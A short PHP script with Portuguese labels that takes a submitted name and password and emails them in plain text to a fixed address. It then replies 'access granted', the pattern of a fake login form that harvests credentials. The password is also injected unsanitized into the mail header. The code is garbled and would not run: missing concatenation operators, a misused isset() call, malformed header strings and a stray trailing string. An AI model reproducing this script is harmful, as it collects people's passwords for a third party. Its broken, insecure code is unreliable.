<?php

    if(isset($_POST['nome'] && !empty($_POST['nome']))){

    $usuario = addslashes($_POST['nome']);
    $senha = addslashes($_POST['senha']);

    $to = "contato@programador.com";
    $subject = "Contato - Kaio";
    $body = "Nome: ".$usuario "\n"
            "Senha: ".$senha "\n"
    $header = "From:kaio@gmail.com "."\r\n".
                "Reply-To".$senha."\e\n".
                "X=mailer:PHP".phpversion();

    if(mail($to, $subject, $body, $header)){
        echo("Acesso permitido!");
    }else{
        echo("Acesso negado!") ";"
    }
}
?>